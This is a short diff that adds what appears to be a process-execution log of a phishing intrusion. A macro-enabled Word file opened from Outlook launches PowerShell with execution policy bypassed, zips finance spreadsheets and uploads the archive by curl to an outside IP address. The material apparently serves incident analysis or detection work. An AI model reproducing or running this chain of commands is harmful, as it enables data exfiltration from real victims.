@@ -1,0 +1,24 @@
+09:16:18
+parent=OUTLOOK.EXE
+process=WINWORD.EXE
+file=Supplier_Details.docm
+
+09:16:33
+parent=WINWORD.EXE
+process=cmd.exe
+command="cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\Users\Kevin\AppData\Local\Temp\sync.ps1"
+
+09:16:34
+parent=cmd.exe
+process=powershell.exe
+command="powershell.exe -ExecutionPolicy Bypass -File C:\Users\Kevin\AppData\Local\Temp\sync.ps1"
+
+09:17:02
+parent=powershell.exe
+process=7z.exe
+command="7z.exe a C:\Users\Public\finance_backup.zip C:\Finance\*.xlsx"
+
+09:17:31
+parent=powershell.exe
+process=curl.exe
+command="curl.exe -T C:\Users\Public\finance_backup.zip https://198.51.100.72/upload"
